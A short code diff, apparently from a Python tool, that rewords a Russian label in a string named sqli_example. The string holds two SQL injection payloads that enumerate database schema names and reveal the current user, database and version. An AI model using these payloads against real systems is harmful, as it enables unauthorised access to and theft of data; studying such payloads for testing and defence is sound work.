@@ -1,4 +1,4 @@
-sqli_example = f'''Узнать имя БД:
+sqli_example = f'''Узнаем имя БД:
 <code>(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)</code>
 
 <code>(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()))</code>
